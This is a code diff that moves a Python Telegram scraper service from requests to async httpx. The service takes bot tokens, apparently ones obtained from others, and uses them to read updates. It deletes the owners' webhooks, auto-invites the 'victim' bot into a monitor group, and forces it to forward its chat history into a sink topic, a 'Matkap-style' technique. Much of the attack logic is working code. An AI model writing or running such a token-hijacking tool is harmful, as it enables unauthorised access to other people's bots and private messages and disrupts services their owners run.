@@ -1,5 +1,6 @@
 from typing import List, Dict, Optional
 import asyncio
+import httpx
 from telethon import TelegramClient
 from telethon.sessions import MemorySession
 from telethon.tl.types import Message, MessageMediaPhoto, MessageMediaDocument
@@ -47,7 +48,7 @@ class ScraperService:
         # Get 'Anchor' ID from Bot API (Strategy 3) to enable Strategy 2
         anchor_id = 0
         try:
-            api_msgs = self._scrape_via_bot_api(bot_token)
+            api_msgs = await self._scrape_via_bot_api(bot_token)
             for m in api_msgs:
                 # Add these finding too
                 if m['telegram_msg_id'] not in unique_ids:
@@ -69,14 +70,16 @@ class ScraperService:
             logger.info("💤 [Scraper] Bot seems dormant (No recent updates). Initiating Kickstart...")
             try:
                 from app.services.user_agent_srv import user_agent
-                import requests
                 import time
 
                 # 1. Get Username (needed for invite)
                 bot_username = "unknown"
-                me_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
-                if me_res.get("ok"):
-                    bot_username = me_res["result"]["username"]
+                async with httpx.AsyncClient() as client:
+                    me_res = await client.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5)
+                    if me_res.status_code == 200:
+                        data = me_res.json()
+                        if data.get("ok"):
+                            bot_username = data["result"]["username"]
                 
                 # 2. Invite to Group (Creates a Service Message -> New ID!)
                 dest = settings.MONITOR_GROUP_ID
@@ -96,7 +99,7 @@ class ScraperService:
                          # ===============================
                          
                          # 3. Re-Poll Updates
-                         retry_msgs = self._scrape_via_bot_api(bot_token)
+                         retry_msgs = await self._scrape_via_bot_api(bot_token)
                          for m in retry_msgs:
                              if m['telegram_msg_id'] > anchor_id:
                                  anchor_id = m['telegram_msg_id']
@@ -140,22 +143,24 @@ class ScraperService:
                          # We can try to get it from cache or just rely on what we know.
                          # If we don't have the username, we can't invite easily by username.
                          # But wait, we have the BOT TOKEN. We can get its username!
-                         import requests
-                         me_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
-                         if me_res.get("ok"):
-                             victim_username = me_res["result"]["username"]
-                             logger.info(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
-                             
-                             # CLEANUP: Remove other bots first (as requested)
-                             whitelist = [x.strip() for x in settings.WHITELISTED_BOT_IDS.split(",") if x.strip()]
-                             if whitelist:
-                                 await user_agent.cleanup_bots(dest_chat_id, whitelist)
-                                 
-                             await user_agent.invite_bot_to_group(victim_username, dest_chat_id)
+                         async with httpx.AsyncClient() as client:
+                             me_res = await client.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5)
+                             if me_res.status_code == 200:
+                                 data = me_res.json()
+                                 if data.get("ok"):
+                                     victim_username = data["result"]["username"]
+                                     logger.info(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
+                                     
+                                     # CLEANUP: Remove other bots first (as requested)
+                                     whitelist = [x.strip() for x in settings.WHITELISTED_BOT_IDS.split(",") if x.strip()]
+                                     if whitelist:
+                                         await user_agent.cleanup_bots(dest_chat_id, whitelist)
+                                         
+                                     await user_agent.invite_bot_to_group(victim_username, dest_chat_id)
                      except Exception as e_invite:
                          logger.warning(f"    ⚠️ [Scraper] Auto-invite failed (skipping): {e_invite}")
 
-                     fwd_msgs = self._scrape_via_forwarding(bot_token, chat_id, dest_chat_id, anchor_id, limit=20)
+                     fwd_msgs = await self._scrape_via_forwarding(bot_token, chat_id, dest_chat_id, anchor_id, limit=20)
                      for m in fwd_msgs:
                         if m['telegram_msg_id'] not in unique_ids:
                             scraped_messages.append(m)
@@ -166,108 +171,105 @@ class ScraperService:
 
         return scraped_messages
 
-    def _create_forum_topic(self, bot_token: str, chat_id: int, name: str) -> int:
+    async def _create_forum_topic(self, bot_token: str, chat_id: int, name: str) -> int:
         """Helper to create a forum topic using a bot."""
-        import requests
         try:
             url = f"https://api.telegram.org/bot{bot_token}/createForumTopic"
-            res = requests.post(url, json={"chat_id": chat_id, "name": name}, timeout=10)
-            if res.status_code == 200 and res.json().get("ok"):
-                return res.json()["result"]["message_thread_id"]
+            async with httpx.AsyncClient() as client:
+                res = await client.post(url, json={"chat_id": chat_id, "name": name}, timeout=10)
+                if res.status_code == 200:
+                    data = res.json()
+                    if data.get("ok"):
+                        return data["result"]["message_thread_id"]
         except Exception as e:
             logger.warning(f"    ⚠️ Topic create failed: {e}")
         return 0
 
-    def _scrape_via_forwarding(self, bot_token: str, from_chat_id: int, to_chat_id: int, start_id: int, limit: int) -> List[Dict]:
+    async def _scrape_via_forwarding(self, bot_token: str, from_chat_id: int, to_chat_id: int, start_id: int, limit: int) -> List[Dict]:
         """
         Matkap-style: Forces bot to forward messages to a sink chat (Forum Topic).
         1. Creates a topic: '💀 @bot_username'
         2. Forwards messages there.
         3. KEEPS them there (no delete).
         """
-        import requests
         import time
         from app.core.config import settings
         
         msgs = []
         base_url = f"https://api.telegram.org/bot{bot_token}"
 
-        # 0. Get Bot Info for Topic Name
-        bot_username = "unknown_bot"
-        try:
-            me = requests.get(f"{base_url}/getMe", timeout=5).json()
-            if me.get("ok"):
-                bot_username = me["result"].get("username", "unknown")
-        except: pass
-
-        # 1. Get Bot ID for proper naming
-        bot_id = "0"
-        try:
-            me = requests.get(f"{base_url}/getMe", timeout=5).json()
-            if me.get("ok"):
-                bot_username = me["result"].get("username", "unknown")
-                bot_id = str(me["result"].get("id", "0"))
-        except: pass
-
-        # 2. Create Topic (using Hunter Bot) with correct naming convention
-        target_thread_id = 0
-        if settings.MONITOR_BOT_TOKEN:
-            topic_name = f"@{bot_username} / {bot_id}"
-            logger.info(f"    [Scraper] Creating topic '{topic_name}'...")
-            target_thread_id = self._create_forum_topic(settings.MONITOR_BOT_TOKEN, to_chat_id, topic_name)
-        
-        if not target_thread_id:
-             logger.warning("    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'...")
-
-        # Scan backwards from start_id
-        for msg_id in range(start_id, max(0, start_id - limit), -1):
+        async with httpx.AsyncClient() as client:
+            # 0. Get Bot Info for Topic Name
+            bot_username = "unknown_bot"
+            bot_id = "0"
             try:
-                # 2. Forward
-                payload = {
-                    "chat_id": to_chat_id,
-                    "from_chat_id": from_chat_id,
-                    "message_id": msg_id
-                }
-                if target_thread_id:
-                    payload["message_thread_id"] = target_thread_id
-
-                res = requests.post(f"{base_url}/forwardMessage", json=payload, timeout=5)
-                
-                if res.status_code == 200:
-                    data = res.json()
+                me_res = await client.get(f"{base_url}/getMe", timeout=5)
+                if me_res.status_code == 200:
+                    data = me_res.json()
                     if data.get("ok"):
-                        result = data["result"]
-                        
-                        # Parse Content
-                        content = result.get('text') or result.get('caption') or ""
-                        
-                        media_type = "text"
-                        file_meta = {}
-                        if 'photo' in result: media_type = 'photo'
-                        elif 'document' in result: media_type = 'document'
-                        
-                        original_sender = "Unknown"
-                        if 'forward_from' in result:
-                            original_sender = result['forward_from'].get('username') or result['forward_from'].get('first_name')
-                        
-                        msgs.append({
-                            "telegram_msg_id": msg_id,
-                            "sender_name": original_sender,
-                            "content": content,
-                            "media_type": media_type,
-                            "file_meta": file_meta,
-                            "chat_id": from_chat_id
-                        })
-                        
-                        # 3. NO DELETE - User wants to keep them!
-                        
-                        time.sleep(0.2) # Rate limit safety
-                        
-                elif res.status_code == 429:
-                    logger.warning("    Rate limit hit, sleeping...")
-                    time.sleep(2)
-            except Exception:
-                pass
+                        bot_username = data["result"].get("username", "unknown")
+                        bot_id = str(data["result"].get("id", "0"))
+            except: pass
+
+            # 2. Create Topic (using Hunter Bot) with correct naming convention
+            target_thread_id = 0
+            if settings.MONITOR_BOT_TOKEN:
+                topic_name = f"@{bot_username} / {bot_id}"
+                logger.info(f"    [Scraper] Creating topic '{topic_name}'...")
+                target_thread_id = await self._create_forum_topic(settings.MONITOR_BOT_TOKEN, to_chat_id, topic_name)
+            
+            if not target_thread_id:
+                 logger.warning("    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'...")
+
+            # Scan backwards from start_id
+            for msg_id in range(start_id, max(0, start_id - limit), -1):
+                try:
+                    # 2. Forward
+                    payload = {
+                        "chat_id": to_chat_id,
+                        "from_chat_id": from_chat_id,
+                        "message_id": msg_id
+                    }
+                    if target_thread_id:
+                        payload["message_thread_id"] = target_thread_id
+
+                    res = await client.post(f"{base_url}/forwardMessage", json=payload, timeout=5)
+                    
+                    if res.status_code == 200:
+                        data = res.json()
+                        if data.get("ok"):
+                            result = data["result"]
+                            
+                            # Parse Content
+                            content = result.get('text') or result.get('caption') or ""
+                            
+                            media_type = "text"
+                            file_meta = {}
+                            if 'photo' in result: media_type = 'photo'
+                            elif 'document' in result: media_type = 'document'
+                            
+                            original_sender = "Unknown"
+                            if 'forward_from' in result:
+                                original_sender = result['forward_from'].get('username') or result['forward_from'].get('first_name')
+                            
+                            msgs.append({
+                                "telegram_msg_id": msg_id,
+                                "sender_name": original_sender,
+                                "content": content,
+                                "media_type": media_type,
+                                "file_meta": file_meta,
+                                "chat_id": from_chat_id
+                            })
+                            
+                            # 3. NO DELETE - User wants to keep them!
+                            
+                            await asyncio.sleep(0.2) # Rate limit safety
+                            
+                    elif res.status_code == 429:
+                        logger.warning("    Rate limit hit, sleeping...")
+                        await asyncio.sleep(2)
+                except Exception:
+                    pass
                 
         return msgs
 
@@ -295,15 +297,6 @@ class ScraperService:
                 batch = ids_to_check[i:min(i + chunk_size, len(ids_to_check))]
                 try:
                     # Request specific IDs
-                    # check if we can filter by entity? get_messages(entity, ids=...)
-                    # We need the entity (Peer).
-                    # 'chat_id' might be int. Telethon needs input entity.
-                    # We can try passing chat_id directly if we have seen it?
-                    # Or 'get_messages(ids=...)' gets from ANY chat? No, usually needs entity.
-                    # Warning: If we don't have the entity in cache, this might fail.
-                    # But if we logged in and 'getUpdates' saw the chat, maybe?
-                    # Let's try passing the chat_id.
-                    
                     found = await client.get_messages(chat_id, ids=batch)
                     
                     for message in found:
@@ -404,67 +397,74 @@ class ScraperService:
             await client.disconnect()
         return msgs
 
-    def _scrape_via_bot_api(self, bot_token: str) -> List[Dict]:
+    async def _scrape_via_bot_api(self, bot_token: str) -> List[Dict]:
         """
-        Fallback: Use requests to hit https://api.telegram.org/bot<token>/getUpdates
+        Fallback: Use httpx to hit https://api.telegram.org/bot<token>/getUpdates
         If webhook is active, delete it first.
         """
-        import requests
         logger.info(f"🔄 [Scraper] Attempting Bot API getUpdates fallback...")
         
         base_url = f"https://api.telegram.org/bot{bot_token}"
-        
-        # First attempt
-        res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
-        
-        # Check for webhook conflict error
-        if res.status_code == 409 or (res.status_code == 200 and not res.json().get('ok') and 'webhook' in res.text.lower()):
-            logger.warning(f"    ⚠️ [Scraper] Webhook detected, attempting to delete...")
-            try:
-                # Delete the webhook
-                del_res = requests.post(f"{base_url}/deleteWebhook", timeout=10)
-                if del_res.status_code == 200 and del_res.json().get('ok'):
-                    logger.info(f"    ✅ [Scraper] Webhook deleted successfully!")
-                    # Retry getUpdates after deleting webhook
-                    import time
-                    time.sleep(1)  # Brief pause for Telegram to process
-                    res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
-                else:
-                    logger.error(f"    ❌ [Scraper] Failed to delete webhook: {del_res.text}")
-            except Exception as e:
-                logger.error(f"    ❌ [Scraper] Webhook deletion error: {e}")
-        
         msgs = []
-        if res.status_code == 200 and res.json().get('ok'):
-            updates = res.json().get('result', [])
-            for update in updates:
-                # We care about 'message', 'edited_message', 'channel_post'
-                target = update.get('message') or update.get('channel_post') or update.get('edited_message')
-                if not target: continue
-                
-                chat = target.get('chat', {})
-                sender = target.get('from', {})
-                
-                content = target.get('text') or target.get('caption') or ""
-                
-                # Determine media
-                media_type = "text"
-                file_meta = {}
-                if 'photo' in target:
-                    media_type = "photo"
-                elif 'document' in target:
-                    media_type = "document"
-                    
-                msgs.append({
-                    "telegram_msg_id": target.get('message_id'),
-                    "sender_name": sender.get('username') or sender.get('first_name') or "Unknown",
-                    "content": content,
-                    "media_type": media_type,
-                    "file_meta": file_meta,
-                    "chat_id": chat.get('id')
-                })
-        else:
-            logger.error(f"    ❌ Bot API Error: {res.text}")
+        
+        async with httpx.AsyncClient(timeout=15.0) as client:
+            # First attempt
+            try:
+                res = await client.get(f"{base_url}/getUpdates", params={'limit': 100})
+            except Exception as e:
+                logger.error(f"    ❌ Bot API Connection Error: {e}")
+                return []
+            
+            # Check for webhook conflict error
+            if res.status_code == 409 or (res.status_code == 200 and not res.json().get('ok') and 'webhook' in res.text.lower()):
+                logger.warning(f"    ⚠️ [Scraper] Webhook detected, attempting to delete...")
+                try:
+                    # Delete the webhook
+                    del_res = await client.post(f"{base_url}/deleteWebhook")
+                    if del_res.status_code == 200 and del_res.json().get('ok'):
+                        logger.info(f"    ✅ [Scraper] Webhook deleted successfully!")
+                        # Retry getUpdates after deleting webhook
+                        await asyncio.sleep(1)  # Brief pause for Telegram to process
+                        res = await client.get(f"{base_url}/getUpdates", params={'limit': 100})
+                    else:
+                        logger.error(f"    ❌ [Scraper] Failed to delete webhook: {del_res.text}")
+                except Exception as e:
+                    logger.error(f"    ❌ [Scraper] Webhook deletion error: {e}")
+            
+            if res.status_code == 200:
+                data = res.json()
+                if data.get('ok'):
+                    updates = data.get('result', [])
+                    for update in updates:
+                        # We care about 'message', 'edited_message', 'channel_post'
+                        target = update.get('message') or update.get('channel_post') or update.get('edited_message')
+                        if not target: continue
+                        
+                        chat = target.get('chat', {})
+                        sender = target.get('from', {})
+                        
+                        content = target.get('text') or target.get('caption') or ""
+                        
+                        # Determine media
+                        media_type = "text"
+                        file_meta = {}
+                        if 'photo' in target:
+                            media_type = "photo"
+                        elif 'document' in target:
+                            media_type = "document"
+                            
+                        msgs.append({
+                            "telegram_msg_id": target.get('message_id'),
+                            "sender_name": sender.get('username') or sender.get('first_name') or "Unknown",
+                            "content": content,
+                            "media_type": media_type,
+                            "file_meta": file_meta,
+                            "chat_id": chat.get('id')
+                        })
+                else:
+                    logger.error(f"    ❌ Bot API Error: {res.text}")
+            else:
+                 logger.error(f"    ❌ Bot API HTTP Error: {res.status_code}")
             
         return msgs
 
@@ -473,8 +473,6 @@ class ScraperService:
         Validates a bot token and discovers chats using Telegram Bot API.
         Returns: (bot_info, discovered_chats)
         """
-        import requests
-        
         base_url = f"https://api.telegram.org/bot{bot_token}"
         discovered_chats = []
         bot_info = {}
@@ -482,55 +480,74 @@ class ScraperService:
         try:
             logger.info(f"🔍 [Discovery] Validating token {bot_token[:15]}... via Bot API")
             
-            # Step 1: Validate token with getMe
-            me_res = requests.get(f"{base_url}/getMe", timeout=10)
-            if me_res.status_code != 200 or not me_res.json().get('ok'):
-                logger.info(f"    ❌ Token invalid or revoked")
-                return {}, []
-            
-            bot_info = me_res.json().get('result', {})
-            logger.info(f"    ✅ Token valid! Bot: @{bot_info.get('username', 'unknown')}")
-            
-            # Step 2: Get recent chats from getUpdates
-            updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
-            if updates_res.status_code == 200 and updates_res.json().get('ok'):
-                updates = updates_res.json().get('result', [])
+            async with httpx.AsyncClient(timeout=15.0) as client:
+                # Step 1: Validate token with getMe
+                try:
+                    me_res = await client.get(f"{base_url}/getMe")
+                except Exception as e:
+                    logger.error(f"    ❌ Connection failed: {e}")
+                    return {}, []
+
+                if me_res.status_code != 200:
+                     logger.info(f"    ❌ Token invalid or revoked (HTTP {me_res.status_code})")
+                     return {}, []
                 
-                # Extract unique chats from updates
-                seen_chats = set()
-                for update in updates:
-                    # Check message, edited_message, channel_post, etc.
-                    for key in ['message', 'edited_message', 'channel_post', 'edited_channel_post', 'my_chat_member', 'chat_member']:
-                        if key in update:
-                            chat = update[key].get('chat', {})
-                            chat_id = chat.get('id')
-                            if chat_id and chat_id not in seen_chats:
-                                seen_chats.add(chat_id)
-                                chat_type = chat.get('type', 'unknown')
-                                chat_name = chat.get('title') or chat.get('username') or chat.get('first_name') or str(chat_id)
-                                
-                                discovered_chats.append({
-                                    "id": chat_id,
-                                    "name": chat_name,
-                                    "type": chat_type
-                                })
-                                logger.info(f"    📍 Found Chat: {chat_name} (ID: {chat_id}, Type: {chat_type})")
+                me_data = me_res.json()
+                if not me_data.get('ok'):
+                    logger.info(f"    ❌ Token invalid or revoked")
+                    return {}, []
                 
-                # If no updates but token is valid, use bot's own ID as fallback
-                if not discovered_chats:
-                    # Token works but no recent activity - still valid!
-                    # Use a placeholder to indicate token is valid but no chats found
-                    logger.info(f"    ℹ️ Token valid but no recent chat activity")
-                    # Return bot info as a "chat" so validation passes
-                    discovered_chats.append({
-                        "id": bot_info.get('id'),
-                        "name": f"@{bot_info.get('username', 'bot')} (Bot Self)",
-                        "type": "bot_self"
-                    })
+                bot_info = me_data.get('result', {})
+                logger.info(f"    ✅ Token valid! Bot: @{bot_info.get('username', 'unknown')}")
+                
+                # Step 2: Get recent chats from getUpdates
+                try:
+                    updates_res = await client.get(f"{base_url}/getUpdates", params={'limit': 100})
+                except Exception as e:
+                     logger.warning(f"    ⚠️ Failed to fetch updates: {e}")
+                     # Return just bot info if updates fail
+                     return bot_info, []
+
+                if updates_res.status_code == 200:
+                    updates_data = updates_res.json()
+                    if updates_data.get('ok'):
+                        updates = updates_data.get('result', [])
+                        
+                        # Extract unique chats from updates
+                        seen_chats = set()
+                        for update in updates:
+                            # Check message, edited_message, channel_post, etc.
+                            for key in ['message', 'edited_message', 'channel_post', 'edited_channel_post', 'my_chat_member', 'chat_member']:
+                                if key in update:
+                                    chat = update[key].get('chat', {})
+                                    chat_id = chat.get('id')
+                                    if chat_id and chat_id not in seen_chats:
+                                        seen_chats.add(chat_id)
+                                        chat_type = chat.get('type', 'unknown')
+                                        chat_name = chat.get('title') or chat.get('username') or chat.get('first_name') or str(chat_id)
+                                        
+                                        discovered_chats.append({
+                                            "id": chat_id,
+                                            "name": chat_name,
+                                            "type": chat_type
+                                        })
+                                        logger.info(f"    📍 Found Chat: {chat_name} (ID: {chat_id}, Type: {chat_type})")
+                        
+                        # If no updates but token is valid, use bot's own ID as fallback
+                        if not discovered_chats:
+                            # Token works but no recent activity - still valid!
+                            # Use a placeholder to indicate token is valid but no chats found
+                            logger.info(f"    ℹ️ Token valid but no recent chat activity")
+                            # Return bot info as a "chat" so validation passes
+                            discovered_chats.append({
+                                "id": bot_info.get('id'),
+                                "name": f"@{bot_info.get('username', 'bot')} (Bot Self)",
+                                "type": "bot_self"
+                            })
+                
+                logger.info(f"🏁 [Discovery] Found {len(discovered_chats)} chat(s) for this bot.")
             
-            logger.info(f"🏁 [Discovery] Found {len(discovered_chats)} chat(s) for this bot.")
-            
-        except requests.Timeout:
+        except httpx.TimeoutException:
             logger.warning(f"    ⚠️ Telegram API timeout")
         except Exception as e:
             logger.error(f"Error discovering chats: {e}")
@@ -545,6 +562,5 @@ class ScraperService:
         """
         # Feature disabled by user request to prevent rate limiting.
         return None
-
 
 scraper_service = ScraperService()
